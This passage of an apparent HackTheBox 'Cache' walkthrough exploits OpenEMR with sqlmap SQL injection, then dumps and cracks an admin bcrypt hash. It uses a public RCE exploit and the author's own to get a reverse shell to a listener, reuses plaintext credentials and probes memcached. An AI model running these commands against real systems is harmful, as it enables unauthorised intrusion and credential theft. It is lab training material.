columns</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a7a71,0x73535a4b567775646f4d7849526d4b6d4a697572466f44734446724d5072526b7079474c6a616242,0x717a716271),NULL-- -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">---</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] the back-end DBMS is MySQL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] fetching banner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">back-end DBMS operating system: Linux Ubuntu</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">back-end DBMS: MySQL &gt;= 5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">banner: &#x27;5.7.30-0ubuntu0.18.04.1&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] fetched data logged to text files under &#x27;/home/cyfun/.sqlmap/output/hms.htb&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [WARNING] you haven&#x27;t updated sqlmap for more than 84 days!!!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] ending @ 23:28:23 /2020-07-14/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Alternatively you can store the raw HTTP request in a file:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host: hms.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept-Language: en-US,en;q=0.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Accept-Encoding: gzip, deflate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Cookie: OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Cache-Control: max-age=0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And then tell sqlmap to use this req file:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sqlmap -r &quot;$(pwd)/sqli.req&quot; --random-agent --threads 10 --batch -b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now let&#x27;s use sqlmap dump options.</p><p><code>--dbs</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">available databases [2]:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] information_schema</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] openemr</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>-D openemr --tables</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Database: openemr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[234 tables]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+---------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| array                                 |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| groups                                |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| sequences                             |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| user_settings                         |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| users                                 |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| users_facility                        |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| users_secure                          |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| valueset                              |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| voids                                 |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| x12_partners                          |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+---------------------------------------+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>-D openemr -T users --columns</code></p><p><code>-D openemr -T users -C username,password --dump</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Database: openemr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Table: users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[3 entries]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+-----------------+--------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| username        | password     |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+-----------------+--------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| openemr_admin   | NoLongerUsed |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| phimail-service | NoLogin      |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| portal-user     | NoLogin      |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+-----------------+--------------+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It seems not to be the right table, lets&#x27; try this one instead.</p><p><code>-D openemr -T users_secure -C username,password --dump</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Database: openemr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Table: users_secure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[1 entry]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+---------------+--------------------------------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| username      | password                                                     |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+---------------+--------------------------------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+---------------+--------------------------------------------------------------+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s put the hash in a file to crack it with <!-- -->[JtR][JtR]<!-- -->:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ printf %s &#x27;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#x27; &gt; hash.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john -w /usr/share/wordlists/password/rockyou.txt --format=bcrypt hash.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Warning: invalid UTF-8 seen reading /usr/share/wordlists/password/rockyou.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Using default input encoding: UTF-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Cost 1 (iteration count) is 32 for all loaded hashes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Will run 2 OpenMP threads</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">xxxxxx           (?)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1g 0:00:00:01 DONE (2020-07-15 00:51) 0.6369g/s 722.2p/s 722.2c/s 722.2C/s water..zombie</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Session completed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john --show hash.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?:xxxxxx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 password hash cracked, 0 left</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we have some creds: <code>openemr_admin</code> / <code>xxxxxx</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-exploitation-openemr-rce">HTTP exploitation (OpenEMR): RCE<a href="#http-exploitation-openemr-rce" class="hash-link" aria-label="Direct link to HTTP exploitation (OpenEMR): RCE" title="Direct link to HTTP exploitation (OpenEMR): RCE">​</a></h3><p>Now we will be able to use the authenticated RCE we found earlier.</p><p><strong>Warning</strong>: Using EDB-48515 that has a neutral impact rather than EDB-45161 that
will reset the config to default for everyone!!!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ searchsploit -m 48515</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Exploit: OpenEMR 5.0.1 - Remote Code Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      URL: https://www.exploit-db.com/exploits/48515</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Path: /usr/share/exploitdb/exploits/php/webapps/48515.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type: ASCII text, with CRLF line terminators</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copied to: /home/cyfun/CTF/HackTheBox/machines/Cache/48515.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s modify, the remote URL, the LHOST, LPORT, and admin creds.</p><p>Then start a listener &amp; start the exploit:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pwncat -l 8888 -vv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on :::8888 (family 10/IPv6, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Client connected from 10.10.10.188:32838 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 23:11:40 up 32 min,  0 users,  load average: 0.07, 0.02, 0.03</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ python2 48515.py</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Authentication with credentials provided please be patient</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Uploading a payload it will take a minute</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] You should be getting a shell</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Afterward I created my own exploit for OpenEMR RCE: <a href="https://github.com/cyfun/OpenEMR-RCE" target="_blank" rel="noopener noreferrer">https://github.com/cyfun/OpenEMR-RCE</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby OpenEMR-RCE/exploit.rb auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby OpenEMR-RCE/exploit.rb semi-auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 -m &#x27;php/reverse_php&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby OpenEMR-RCE/exploit.rb manual -r http://hms.htb -u openemr_admin -p xxxxxx -s tmp548.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--www-data-to-ash">Privilege Escalation of Machine : www-data to ash<a href="#privilege-escalation-of-machine--www-data-to-ash" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : www-data to ash" title="Direct link to Privilege Escalation of Machine : www-data to ash">​</a></h3><p>We can use the credentials (<code>ash</code> / <code>H@v3_fun</code>) we found at the beginning.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ which python3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/bin/python3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data@cache:/$ su ash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">su ash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: H@v3_fun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash@cache:/$ cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash@cache:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">aebbdcd5e2a33812b7db84f42f124ea5</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>But this is totally optional it&#x27;s possible to jump over this step and directly
elevate to user luffy from www-data.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--ash-to-luffy">Privilege Escalation of Machine : ash to luffy<a href="#privilege-escalation-of-machine--ash-to-luffy" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : ash to luffy" title="Direct link to Privilege Escalation of Machine : ash to luffy">​</a></h3><p>Let&#x27;s see open TCP sockets:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ss -nlpt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128                    [::]:22                  [::]:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128                    [::]:11211               [::]:*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LISTEN   0         128                       *:80                     *:*</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ohoh we have port 11211 used by memcached.</p><p>We can confirm the process is running:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ps -ef f | grep memcached</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">memcache  1125     1  0 22:39 ?        Ssl    0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash       6235  5474  0 23:30 pts/1    S+     0:00  |                           \_ grep --color=auto memcached</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data  4693  4669  0 23:04 ?        Sl     0:00  |               \_ memcached</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s check some advices on <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a>: <a href="https://book.hacktricks.xyz/pentesting/11211-memcache" target="_blank" rel="noopener noreferrer">11211 - Pentesting Memcache</a></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ telnet 127.0.0.1 11211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">telnet 127.0.0.1 11211</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Trying 